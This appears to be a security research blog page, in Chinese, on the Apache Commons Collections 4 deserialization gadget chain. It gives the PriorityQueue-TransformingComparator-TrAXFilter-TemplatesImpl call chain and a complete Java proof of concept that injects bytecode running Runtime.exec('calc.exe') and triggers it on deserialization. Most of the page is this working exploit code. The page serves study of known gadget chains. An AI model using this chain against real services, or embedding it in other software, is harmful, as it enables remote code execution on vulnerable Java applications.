@@ -1,0 +1,240 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    
+    
+    <link rel="shortcut icon" href="../../../../../../../img/favicon.ico">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>Apache-Commons-Collections 4 - ConsT27's Blog</title>
+    <link href="../../../../../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../../../../../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../../../../../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../../../../../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../../../../../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../../../../../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../../../../../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../../../../../../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "Apache-Commons-Collections 4", url: "#_top", children: [
+              {title: "\u76ee\u5f55", url: "#_1" },
+              {title: "\u7248\u672c", url: "#_2" },
+              {title: "\u5229\u7528\u94fe", url: "#_3" },
+          ]},
+        ];
+
+    </script>
+    <script src="../../../../../../../js/base.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../../Apache-Commons-Collections%205/Apache-Commons-Collections%205/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../../Apache-Commons-Collections%205/Apache-Commons-Collections%205/" class="btn btn-xs btn-link">
+        Apache-Commons-Collections 5
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../../Apache-Commons-Collections%203/Apache-Commons-Collections%203/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../../Apache-Commons-Collections%203/Apache-Commons-Collections%203/" class="btn btn-xs btn-link">
+        Apache-Commons-Collections 3
+      </a>
+    </div>
+    
+  </div>
+
+    
+
+    <h1 id="apache-commons-collections-4">Apache-Commons-Collections 4</h1>
+<h2 id="_1">目录</h2>
+<ul>
+<li><a href="#版本">版本</a></li>
+<li><a href="#利用链">利用链</a></li>
+</ul>
+<p>CC2,3的缝合，细节上有些许差别.</p>
+<p>PriorityQueue+TrAXFilter+InstantiateTransformer+TemplatesImpl</p>
+<h2 id="_2">版本</h2>
+<p>CommonsCollections 4.0，JDK暂无限制，需javassist依赖</p>
+<h2 id="_3">利用链</h2>
+<pre><code class="language-java">ObjectInputStream.readObject()
+    PriorityQueue.readObject()
+        PriorityQueue.heapify()
+            PriorityQueue.siftDown()
+                PriorityQueue.siftDownUsingComparator()
+                    TransformingComparator.compare()
+                        ChainedTransformer.transform()
+                            ConstantTransformer.transform()
+                            InstantiateTransformer.transform()
+                            newInstance()
+                                TrAXFilter#TrAXFilter()
+                                TemplatesImpl.newTransformer()
+                                         TemplatesImpl.getTransletInstance()
+                                         TemplatesImpl.defineTransletClasses
+                                         newInstance()
+                                            Runtime.exec()
+</code></pre>
+<p>POC</p>
+<pre><code class="language-java">import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
+import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
+import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
+import javassist.*;
+import org.apache.commons.collections4.Transformer;
+import org.apache.commons.collections4.functors.ChainedTransformer;
+import org.apache.commons.collections4.functors.ConstantTransformer;
+import org.apache.commons.collections4.functors.InstantiateTransformer;
+import org.apache.commons.collections4.comparators.TransformingComparator;
+import javax.xml.transform.Templates;
+import java.io.*;
+import java.lang.reflect.Field;
+import java.util.PriorityQueue;
+
+public class Main {
+    public static void main(String[] args) throws Exception {
+
+        ClassPool pool = ClassPool.getDefault();
+        pool.insertClassPath(new ClassClassPath(AbstractTranslet.class));
+        CtClass cc = pool.makeClass(&quot;Cat&quot;);
+        String cmd = &quot;java.lang.Runtime.getRuntime().exec(\&quot;calc.exe\&quot;);&quot;;
+        // 创建 static 代码块，并插入代码
+        cc.makeClassInitializer().insertBefore(cmd);
+        String randomClassName = &quot;EvilCat&quot; + System.nanoTime();
+        cc.setName(randomClassName);
+        cc.setSuperclass(pool.get(AbstractTranslet.class.getName())); //设置父类为AbstractTranslet，避免报错
+        // 写入.class 文件
+        byte[] classBytes = cc.toBytecode();
+        byte[][] targetByteCodes = new byte[][]{classBytes};
+        TemplatesImpl templates = TemplatesImpl.class.newInstance();
+        setFieldValue(templates, &quot;_bytecodes&quot;, targetByteCodes);
+        // 进入 defineTransletClasses() 方法需要的条件
+        setFieldValue(templates, &quot;_name&quot;, &quot;name&quot;);
+        setFieldValue(templates, &quot;_class&quot;, null);
+
+        /**
+         * TrAXFilter 构造函数能直接触发 所以不用利用 invoke 那个
+         */
+        ChainedTransformer chain = new ChainedTransformer(new Transformer[] {
+                new ConstantTransformer(TrAXFilter.class),
+                new InstantiateTransformer(new Class[]{Templates.class},new Object[]{templates})
+        });
+
+        TransformingComparator comparator = new TransformingComparator(chain);
+        PriorityQueue queue = new PriorityQueue(1);
+
+        queue.add(1);
+        queue.add(2);
+
+
+        Field comparator_field = Class.forName(&quot;java.util.PriorityQueue&quot;).getDeclaredField(&quot;comparator&quot;);
+        comparator_field.setAccessible(true);
+        comparator_field.set(queue,comparator);
+
+        try{
+            ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream(&quot;./cc4&quot;));
+            outputStream.writeObject(queue);
+            outputStream.close();
+
+            ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream(&quot;./cc4&quot;));
+            inputStream.readObject();
+        }catch(Exception e){
+            e.printStackTrace();
+        }
+    }
+
+    public static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception {
+        final Field field = getField(obj.getClass(), fieldName);
+        field.set(obj, value);
+    }
+
+    public static Field getField(final Class&lt;?&gt; clazz, final String fieldName) {
+        Field field = null;
+        try {
+            field = clazz.getDeclaredField(fieldName);
+            field.setAccessible(true);
+        }
+        catch (NoSuchFieldException ex) {
+            if (clazz.getSuperclass() != null)
+                field = getField(clazz.getSuperclass(), fieldName);
+        }
+        return field;
+    }
+}
+</code></pre>
+<p>并没有什么新东西，具体逻辑便是通过设置PriorityQueue 的comparator属性为我们定义好的ChainedTransformer ，使ChainedTransformer 的transformer方法执行，结合TrAXFilter与InstantiateTransformer触发TemplatesImpl 恶意字节码的类生成并触发其构造方法达到命令执行的目的。</p>
+
+  <br>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../../Apache-Commons-Collections%205/Apache-Commons-Collections%205/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../../Apache-Commons-Collections%205/Apache-Commons-Collections%205/" class="btn btn-xs btn-link">
+        Apache-Commons-Collections 5
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../../Apache-Commons-Collections%203/Apache-Commons-Collections%203/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../../Apache-Commons-Collections%203/Apache-Commons-Collections%203/" class="btn btn-xs btn-link">
+        Apache-Commons-Collections 3
+      </a>
+    </div>
+    
+  </div>
+
+    <br>
+</div>
+
+<footer class="container-fluid wm-page-content">
+  <p>Documentation built with <a href="https://www.mkdocs.org/">MkDocs</a> using <a href="https://github.com/gristlabs/mkdocs-windmill">Windmill</a> theme by Grist Labs.</p>
+</footer>
+
+</body>
+</html>
